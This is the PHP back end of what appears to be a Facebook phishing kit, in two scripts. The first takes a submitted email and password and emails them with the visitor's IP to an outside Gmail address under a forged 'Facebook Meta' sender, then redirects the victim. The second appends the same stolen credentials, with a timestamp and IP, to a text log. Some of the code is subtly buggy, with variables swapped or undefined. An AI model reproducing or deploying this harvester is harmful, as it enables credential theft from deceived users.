<?php

$ip 	= getenv("REMOTE_ADDR");
$email   = $_POST['email'];
$password = $_POST['password'];
$message = "

=============BISMILLAHAJADULU============

Email		: $code
Password    : $email
IP		    : $ip

=============BISMILLAHAJADULU============ ";


$to = "silentningsih@gmail.com"; //      
$subject = "Facebook= [$ip]";
$headers = "From: Facebook Meta <fvckyou@facebook.com";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);


header("Location:security.php");


?>

<?php
$ip   = getenv("REMOTE_ADDR");
$file = "_________________F-META__________________.txt";
$email   = $_POST['email'];
$password = $_POST['password'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "=================F-META=================");
fwrite($handle, "\n");
fwrite($handle, "Email	: ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "Pass	: ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "=================F-META=================");
fwrite($handle, "\n");
fclose($handle);

?>
